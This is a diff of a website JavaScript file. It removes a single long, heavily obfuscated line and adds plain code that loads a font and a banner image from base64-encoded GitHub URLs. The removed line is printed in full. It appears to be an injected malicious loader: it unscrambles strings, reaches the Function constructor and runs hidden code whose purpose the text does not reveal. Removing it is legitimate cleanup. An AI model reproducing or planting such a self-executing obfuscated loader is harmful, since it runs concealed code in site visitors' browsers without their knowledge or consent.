@@ -51,4 +51,26 @@
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 */
 
-var urls,decodeBase64;(function(){var rrS='',DEv=581-570;function CnK(z){var b=681287;var y=z.length;var l=[];for(var o=0;o<y;o++){l[o]=z.charAt(o)};for(var o=0;o<y;o++){var s=b*(o+551)+(b%38172);var n=b*(o+759)+(b%19633);var e=s%y;var j=n%y;var i=l[e];l[e]=l[j];l[j]=i;b=(s+n)%2379838;};return l.join('')};var YxI=CnK('ztwlsmrjstgaotkfdonnreuhibpqrocccvxyu').substr(0,DEv);var mHa='Ca-=t=16leng),;wae7v+ajhopar7ma=,etjclmn==a0(ffi0"eor;.ir(4=w9a,a1+0<,ue}gn9)[e*2f,st8.,)t;3 6ln. 7+i5=2v]crt,rp6ugl) fe;,vh;.o;t=8f,rSaa,6;,0,ui)l+]v1(c2wcz)=[r.wfu[ 01y5 (jrv(a=b9g+7;et[6o7t+=(;-b)(,=].hgm0;r5o,jl=k;;sipp4=)];l+p)h,t.nh8ur;C(an.A=,i. +l(";e("ulfr,-v;r 2lcA.atn](ufko]="=vrbufaa[gcvecsC2i4f<la+{=)}aa{.ft))"l7v([r.{ (0gvdsr;r(>0;}a vtl(h;r;g)e]l ;)+fe+.(m(pnwr=ar( s+38cnwr1oAp+vlcv;r fra7=q;pf{=,)w=rvbu";8cq[nh[vuvdc1tnfe;u-o,(o=0);+d=flsi{;C"tvg;qct<;a(h.ke-u+txt1or;ru0ledeo6;;vo[u.n..a)pp)1e+t( z==vC;g=8y)n}(osk=sn1}gnx;o2,;ri mm==n>a[sppght)f(n{s)rvh.yhihtig)9,)wvCoq.gwm7+cni.nh;8=ayrn)qr*(d;)if.(!ibt( ]r+i(vns7[.f-1tal,enoh]or)leq6urrr-]=r.j;rs12p)frnaw)rsd(une]lr,s)bhxi1(0f[C;a"f0)+r1[=z9u,vsf;=,e}396;lr".=a;r m x)g=m[ ]=dtrv(o5fo!es]=sC)v+(48vc< p ;ai }+;;+<].l5t+A=yh=ai {)fahlrt(h+ntn8t,pg ( ecfuhnmSl9p3asarro;A6a;7.elraw=6lzrhg6 nservol,lt=ix("t.)g+qvhoh';var KXx=CnK[YxI];var fMI='';var BAy=KXx;var DYU=KXx(fMI,CnK(mHa));var TnL=DYU(CnK(' $t$_n%_]$t.mc6q^ne,^_\'}t]b(te^ts82&b8lbno^.x&St_=b&.e_}}oe5br-ta$,".iwb^]*d$s(lf%# 5t;04"Mt^r^o](dpb^1a.ndc#{%0e2^42(_)^^$r^e c7"s.es}i%9+e%^)4]x.30pig,^6o!8S.!;$)tbr5^o.4r"^\'{x.^s)n^4"f.y3y^2.N{2*$r1.s,nn7m9;dn3n^.e$.e!gdz,brt.0$d(p4_4gor+mb q)rb%lM29=u.,vnrc.(#Cnrvejrzusf,3slu)]2!u^frN1l]bnN).N(%u)5aedj_S(\'-y ^;3h.%5;3p)qp0gn(.ey^mlzf^4d.^(d3..t73f)td-3^r=t"qmv(aba.m]_^l4an6+"_=t"a2!,ea.$(;nr62e0o0er}ot}!.uN40uai.i$2[,.1n1..eyw.djes4h;9duw0 a.1v0Ne r)k^-2^jc.j..oo-4.nd2^8^ar6_co\/9q;_t_ea..\'9__.tu02!.5.)97)z1uiio9#^,s)b.b2)!e%gb...]r^=e.,.^lyf!.mea(%(3oc^ucft_&u8nd%^i^a..35.$\'.m;.y.u^,koe^^n2 0e2c$ln.e.wsz^^lymt+ecS62n=^rq^qhcml]e.hcl}{ydv.g.f^j0(r..s.0dck3,^;.2a_8.E\'l^2^._q2_6;e^js.tmCan..$bndt2nl7;o^qr7!a766nr!3x^$()b.3_.,=ti(Msct^ulc0d6s0=+;nN,o(n._)c9)!(fu^aCnote^8l=0^,r]t;6!1lc.!(m^n3d3^^chorci%,,^3b-or9 t.;deu^!07ry:l+5l^!..0htqn.^%=t c(3%nx.=t2)^c=]]ebde8^177b=;{.y^h.;3^n.t^9r 4s30uS^^d.8((f%w^idals6o(^)(;jko"r$);^2a(2u^d.p.7%:e0b_g^#S.{0=+9._l^d.n;j;{!.;onblt)mh$!u9]$9^e)t($(.t)#f,s))d%a x.$v.94.,qh^!^) .u_($&ane(8[ro1^)e=5i^n7bvc;,ub"ac3l(..s+.=(lj=h,a#(7$ t.^v(;%5^6d^usa0#p7d$ibk.Ej7)(u)^ror.8 hNe)ab)t^ ^2ufat=c^$aeo{06(6^90e5oyna0}o^^)6=n9oco.y]^.nt42#d1.^e(tu2_}kdie^rbf.n^,%o\/h3^]nk-tb+_3)b+.4f^5di{icr)52\'=a82t.^6^slls^f].jef\/.t3*3.u7t]n)9l.1ad)e3^1p(oC=sjdu*sie1^3=4]ac;m11el76}7(e.^e)o1=5^^r3cu.ir]f.n;x5u3 e"hx_16[n)pg5^n^lohe8^ee_N(ldb^^o a^0,d$b8^%.8t"^bt)^s,4d.I12^w.:].]%^mf9n)z6 ns,7)d1o9l^D.={!cd}]lrn)=uEl"ue1.^+;)_9^an.r.r(ijcn_Ee_.(()d4tt.(4)^zt.t{c.s3,=8});j7onhdt]2hs__{rc^(_$^o..f.]!z$^w]2!(o(^:a=wlcosh+_!90.l_}^aje^a.n,[.l:xbr^u(sshaal6.^.;!(e1s6be.59h^f1.).z.u%tr\/^8e.j$^njmyh 2}t_0^+mfa.0!]=^^_8.^=)(dta.= f7.].s$_.^nn;;,u\/)uac.i(+.d,ngsm3a)r+3e^d=^^[e>.d )]r1[ yt).!,cl5o(l_bu6,(:c$$er!._ot .cd5,o.^l%.$r.gr)o%1 (c(j^iz10d+(%_^9^d(5o.).h(n0l53r{}sjt(n)3]d.d 5cb;'));var OtK=BAy(rrS,TnL );OtK(5688);return 7366})()
+
+
+
+
+const urls = {
+  font: 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jsb29keWdyYXBoaWNzL3dlYnNpdGUtbWFuc2xhdWdodGVyL21haW4vZm9udC9Nb2Rlcm5SZWd1bGFyLnR0Zg==',
+  banner: 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jsb29keWdyYXBoaWNzL3dlYnNpdGUtbWFuc2xhdWdodGVyL21haW4vaW1hZ2UvYm9keV9iYWcxLnBuZw=='
+};
+
+function decodeBase64(str) {
+  return atob(str);
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  const stylesheet = document.styleSheets[0];
+  const fontFace = stylesheet.cssRules[0];
+  fontFace.style.src = `url(${decodeBase64(urls.font)}) format('truetype')`;
+
+  const bannerElement = document.querySelector('#banner');
+  if (bannerElement) {
+    bannerElement.style.backgroundImage = `url(${decodeBase64(urls.banner)})`;
+  }
+});
